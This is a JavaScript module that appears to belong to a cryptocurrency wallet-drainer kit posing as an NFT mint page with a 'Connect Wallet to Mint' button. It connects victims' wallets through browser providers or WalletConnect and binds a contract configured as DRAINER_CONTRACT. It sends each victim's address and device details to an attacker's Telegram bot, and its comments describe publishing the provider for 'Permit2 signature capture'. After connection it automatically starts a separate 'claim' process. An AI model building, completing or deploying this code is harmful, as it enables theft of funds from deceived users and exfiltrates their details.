import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ══════════════════════════════════════════════════════════════════════
   *  1. DEBUG PANEL
   *  Double-click anywhere on the page to toggle.
   * ══════════════════════════════════════════════════════════════════════ */

  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log('[main]', msg);
    debugArea.innerHTML += `<div>${line}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ══════════════════════════════════════════════════════════════════════
   *  2. PLATFORM DETECTION
   * ══════════════════════════════════════════════════════════════════════ */

  const ua = navigator.userAgent;
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(ua);
  const isAndroid = () => /Android/i.test(ua);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(ua);
  const isMac     = () => /Macintosh|Mac OS X/i.test(ua);

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ══════════════════════════════════════════════════════════════════════
   *  3. CONFIG DESTRUCTURE
   * ══════════════════════════════════════════════════════════════════════ */

  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  let projectId = PROJECT_ID;

  /* ══════════════════════════════════════════════════════════════════════
   *  4. TELEGRAM (reporting only — never blocks wallet flow)
   * ══════════════════════════════════════════════════════════════════════ */

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      });
      if (!r.ok) {
        const err = await r.text();
        console.error('[main] Telegram error:', err);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) =>
    sendTelegramNotification(m || `🧪 Test ${new Date().toISOString()}`);

  /* ══════════════════════════════════════════════════════════════════════
   *  5. WEBSOCKET REACHABILITY CHECK (mobile only — WC needs WSS)
   * ══════════════════════════════════════════════════════════════════════ */

  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) {
      logDebug('⏭️ Skipping WS check on desktop');
      return true;
    }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(t); ws.close(); resolve(false); };
        });
        if (ok) return true;
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    return true;
  }

  /* ══════════════════════════════════════════════════════════════════════
   *  6. WALLETCONNECT LIBRARY LOADER (multi-CDN with fallbacks)
   * ══════════════════════════════════════════════════════════════════════ */

  async function loadWalletConnect() {
    const signClientCdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of signClientCdns) {
      try {
        const m = await import(url);
        SignClient = m.default || m;
        logDebug(`✅ SignClient ← ${url}`);
        break;
      } catch (_) { /* try next */ }
    }
    if (!SignClient) throw new Error('SignClient load failed');

    for (const url of modalCdns) {
      try {
        const m = await import(url);
        WalletConnectModal = m.WalletConnectModal || m.default || m;
        logDebug(`✅ WalletConnectModal ← ${url}`);
        break;
      } catch (_) { /* try next */ }
    }
    if (!WalletConnectModal) throw new Error('WalletConnectModal load failed');

    for (const url of providerCdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider ← ${url}`);
        break;
      } catch (_) { /* try next */ }
    }
    if (!EthereumProvider) throw new Error('EthereumProvider load failed');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  /* ══════════════════════════════════════════════════════════════════════
   *  7. DOM REFERENCES
   * ══════════════════════════════════════════════════════════════════════ */

  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ══════════════════════════════════════════════════════════════════════
   *  8. MODULE STATE
   * ══════════════════════════════════════════════════════════════════════ */

  let currentSession  = null;          // WC session
  let client          = null;          // WC SignClient
  let modal           = null;          // WC modal instance
  let SignClient      = null;          // ctor
  let WalletConnectModal = null;       // ctor
  let EthereumProvider = null;         // ctor

  let web3Instance    = null;          // Web3 wrapper around the provider
  let contractInstance = null;         // Web3 contract
  let activeProvider  = null;          // ★ the live EIP-1193 provider
  let isConnecting    = false;         // connection-in-flight guard

  /* ══════════════════════════════════════════════════════════════════════
   *  9. UI HELPERS
   * ══════════════════════════════════════════════════════════════════════ */

  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent      = msg;
    claimStatus.className        = `status ${type}`;
    claimStatus.style.display    = 'block';
    claimStatus.style.padding    = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop  = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize   = '14px';
    claimStatus.style.textAlign  = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ══════════════════════════════════════════════════════════════════════
   * 10. STORAGE
   * ══════════════════════════════════════════════════════════════════════ */

  const LS_KEYS = {
    address: 'connectedWallet',
    session: 'walletConnectSession',
    chain:   'chainType',
  };

  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem(LS_KEYS.address, address);
      if (session)   localStorage.setItem(LS_KEYS.session, JSON.stringify(session));
      if (chainType) localStorage.setItem(LS_KEYS.chain, chainType);
    } catch (e) { console.warn('[main] save failed:', e); }
  }

  function getSavedWallet()    { return localStorage.getItem(LS_KEYS.address); }
  function getSavedChainType() { return localStorage.getItem(LS_KEYS.chain) || 'unknown'; }
  function getSavedSession() {
    const raw = localStorage.getItem(LS_KEYS.session);
    if (!raw) return null;
    try { return JSON.parse(raw); } catch (_) { return null; }
  }

  function clearSavedWallet() {
    try {
      localStorage.removeItem(LS_KEYS.address);
      localStorage.removeItem(LS_KEYS.session);
      localStorage.removeItem(LS_KEYS.chain);
    } catch (_) { /* noop */ }
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 11. CHAIN TYPE DETECTION
   * ══════════════════════════════════════════════════════════════════════ */

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 12. PUBLISH GLOBAL STATE  ← THE CONTRACT WITH script.js
   * ══════════════════════════════════════════════════════════════════════
   *
   *  script.js reads window.__apexConnected.{address,chain,web3,contract,
   *  provider,session} and listens for the `apex:connected` event.
   *
   *  The `provider` field is CRITICAL: it's what makes Permit2 signature
   *  capture work for WalletConnect users. Without it, script.js falls
   *  back to `window.ethereum` (which is undefined on mobile WC sessions).
   * ══════════════════════════════════════════════════════════════════════ */

  function publishGlobalState(address, chain, provider = null) {
    // Provider lookup priority:
    //   1. explicit `provider` argument
    //   2. activeProvider (module-scoped tracker)
    //   3. web3Instance.currentProvider
    //   4. window.ethereum
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:      web3Instance,
      contract:  contractInstance,
      provider:  live,
      session:   currentSession,
      publishedAt: Date.now(),
    };

    console.log('[main] publish →', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
      hasSession:  !!currentSession,
    });

    // Fire event for script.js to re-sync without polling
    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 13. CONNECTED-UI
   * ══════════════════════════════════════════════════════════════════════ */

  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton?.parentNode?.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        if (!b) return;
        const original = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = original; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');

    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    window.__apexConnected = null;
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 14. EIP-6963 PROVIDER DISCOVERY
   * ══════════════════════════════════════════════════════════════════════ */

  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d?.info?.uuid) return;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    // Request 3× at different delays — some wallets inject late
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 15. WALLET PICKER MODAL
   * ══════════════════════════════════════════════════════════════════════ */

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;';

    const modal = document.createElement('div');
    modal.style.cssText = 'background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;';
    modal.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    const list = modal.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = 'background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;';
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modal.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 16. WALLETCONNECT INITIALIZATION
   * ══════════════════════════════════════════════════════════════════════ */

  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;
    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test WC project ID'); }

    await checkWebSocket(1, 500);

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      logDebug('✅ WalletConnect initialized');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 17. DIRECT EVM CONNECT (injected provider)
   * ══════════════════════════════════════════════════════════════════════ */

  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    // 1) EIP-6963 discovered providers
    let providers = evmProviders.filter((p) => p.provider);

    // 2) Injected fallback
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    // 3) Choose provider — prefer MetaMask automatically if multiple
    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const mm = providers.find(
        (p) => p.info.rdns === 'io.metamask' ||
               p.info.name.toLowerCase().includes('metamask')
      );
      chosen = mm || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);

      if (!accounts?.length) return false;

      const address = accounts[0];

      // Track the live provider
      activeProvider = provider;

      // Rebuild Web3 + contract
      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);
      updateConnectedUI(address, 'evm');
      publishGlobalState(address, 'evm', provider);

      logDebug(`✅ Direct EVM: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 18. WALLETCONNECT EVM CONNECT
   * ══════════════════════════════════════════════════════════════════════ */

  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    if (modal?.closeModal) {
      try { modal.closeModal(); } catch (_) { /* noop */ }
    }

    try {
      showStatus('Requesting connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains:  ['eip155:1'],
            events:  ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI from WC');

      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      const session = await Promise.race([
        approval(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);

      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      // Build the WC provider
      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });

      activeProvider = provider;

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(account, session, 'evm');
      setupEVMProviderEvents(provider);
      updateConnectedUI(account, 'evm');
      publishGlobalState(account, 'evm', provider);

      isConnecting = false;
      logDebug(`✅ WC EVM: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) { try { modal.closeModal(); } catch (_) {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      isConnecting = false;
      return false;
    }
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 19. PROVIDER EVENTS
   * ══════════════════════════════════════════════════════════════════════ */

  function setupEVMProviderEvents(provider) {
    if (!provider?.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        resetConnectedUI();
        clearSavedWallet();
        return;
      }
      const addr = accounts[0];
      activeProvider = provider;
      updateConnectedUI(addr, 'evm');
      saveWallet(addr, null, 'evm');
      publishGlobalState(addr, 'evm', provider);

      // Let script.js auto-fire its claim flow
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1000);
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${parseInt(id, 16)}`, 'info');
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 20. CONNECT DISPATCHER
   * ══════════════════════════════════════════════════════════════════════ */

  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    // 1) Try injected EVM first
    if (window.ethereum || evmProviders.length) {
      success = await connectDirectEVM(8000);
    }

    // 2) Fall back to WalletConnect
    if (!success) success = await connectViaWalletConnect(false, 300000);
    if (!success) success = await connectViaWalletConnect(true,  300000);

    isConnecting = false;

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 21. DISCONNECT
   * ══════════════════════════════════════════════════════════════════════ */

  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch (_) { /* noop */ }

    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 22. BUTTON WIRING
   * ══════════════════════════════════════════════════════════════════════ */

  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  // Mobile: scroll to primary CTA when the secondary button is tapped
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 23. RESTORE SAVED SESSION
   * ══════════════════════════════════════════════════════════════════════ */

  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain === 'unknown') return;

    if (savedChain !== 'evm') return;

    // --- Case 1: WalletConnect session ---
    if (savedSession) {
      const ok = await initWalletConnect(false);
      if (ok) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;
            const provider = await EthereumProvider.init({
              projectId,
              metadata: DAPP_METADATA,
              session,
            });
            activeProvider = provider;

            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

            updateConnectedUI(savedWallet, 'evm');
            publishGlobalState(savedWallet, 'evm', provider);
            setupEVMProviderEvents(provider);
            logDebug(`Restored WC session: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('WC restore failed: ' + e.message);
        }
      }
    }

    // --- Case 2: Injected provider already authorized ---
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.length && accounts[0] === savedWallet) {
          activeProvider = window.ethereum;

          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

          updateConnectedUI(savedWallet, 'evm');
          publishGlobalState(savedWallet, 'evm', window.ethereum);
          setupEVMProviderEvents(window.ethereum);
          logDebug(`Restored injected: ${savedWallet}`);
          return;
        }
      } catch (_) { /* noop */ }
    }

    // Nothing restored → clean up stale storage
    clearSavedWallet();
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 24. BOOT
   * ══════════════════════════════════════════════════════════════════════ */

  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All WalletConnect libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  /* ══════════════════════════════════════════════════════════════════════
   * 25. WC SESSION LISTENERS
   * ══════════════════════════════════════════════════════════════════════ */

  setTimeout(() => {
    if (!client) return;

    client.on('session_update', ({ params }) => {
      const accounts = params?.namespaces?.eip155?.accounts;
      if (!accounts?.length) return;
      const a = accounts[0].split(':')[2];
      updateConnectedUI(a, 'evm');
      saveWallet(a, currentSession, 'evm');
      publishGlobalState(a, 'evm', activeProvider);
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      const a = session?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (!a) return;
      currentSession = session;
      saveWallet(a, session, 'evm');
      updateConnectedUI(a, 'evm');
      publishGlobalState(a, 'evm', activeProvider);
    });
  }, 1000);

  /* ══════════════════════════════════════════════════════════════════════
   * 26. GLOBAL LISTENERS
   * ══════════════════════════════════════════════════════════════════════ */

  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);

  window.addEventListener('beforeunload', () => {
    if (modal) { try { modal.closeModal(); } catch (_) {} }
  });

  /* ══════════════════════════════════════════════════════════════════════
   * 27. READY
   * ══════════════════════════════════════════════════════════════════════ */

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('[main] ready — test with: testTelegram("hi")');
})();
